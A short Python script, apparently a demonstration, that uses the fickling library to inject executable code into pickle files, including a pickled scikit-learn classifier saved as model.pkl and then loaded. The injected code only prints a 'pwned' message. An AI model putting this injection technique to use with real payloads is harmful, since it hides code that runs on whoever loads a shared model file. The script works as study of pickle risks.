# import pickle
# import pickletools
#
#
# class Data:
#     def __init__(self, important_stuff: str):
#         self.important_stuff = important_stuff
#
#
# d = Data("42")
#
# with open('payload.pkl', 'wb') as f:
#     pickle.dump(d, f)
#
# from fickling.pickle import Pickled
# import pickle
#
# # Create a malicious pickle
# data = "my friend needs to know this"
#
# pickle_bin = pickle.dumps(data)
#
# p = Pickled.load(pickle_bin)
#
# p.insert_python_exec('print("you\'ve been pwned !")')
#
# with open('payload.pkl', 'wb') as f:
#     p.dump(f)
#
# # innocently unpickle and get your friend's data
# with open('payload.pkl', 'rb') as f:
#     data = pickle.load(f)
#     print(data)


# 存储模型
import pickle

from fickling.fickle import Pickled
from sklearn.ensemble import RandomForestClassifier

# Train a model
model = RandomForestClassifier()

data = model

pickle_bin = pickle.dumps(data)

p = Pickled.load(pickle_bin)
p.insert_python_exec('print("you\'ve been pwned !")')

# Save the model to a file
with open('model.pkl', 'wb') as f:
    p.dump(f)

# 读取并加载模型
with open('model.pkl', 'rb') as f:
    model = pickle.load(f)


print(model)
# Make predictions
predictions = model.predict('1 2 3 4 5 6 7 8 9 10')
